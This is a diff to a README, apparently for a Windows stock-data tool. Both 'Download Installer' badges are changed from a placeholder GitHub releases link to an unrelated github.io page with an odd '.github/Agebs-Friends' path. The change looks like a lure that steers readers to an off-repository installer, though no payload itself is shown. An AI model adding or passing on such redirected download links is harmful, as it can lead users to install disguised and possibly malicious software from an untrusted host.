@@ -17,7 +17,7 @@
 
 <div align="left">
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/YOUR_USERNAME/YOUR_REPO/releases)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=for-the-badge&logo=windows&logoColor=white)](https://cadenshahercx.github.io/.github/Agebs-Friends)
 
 </div>
 
@@ -88,6 +88,6 @@ export ALPHA_VANTAGE_API_KEY="..."
 
 <div align="left">
 
-[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/YOUR_USERNAME/YOUR_REPO/releases)
+[![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=for-the-badge&logo=windows&logoColor=white)](https://cadenshahercx.github.io/.github/Agebs-Friends)
 
 </div>
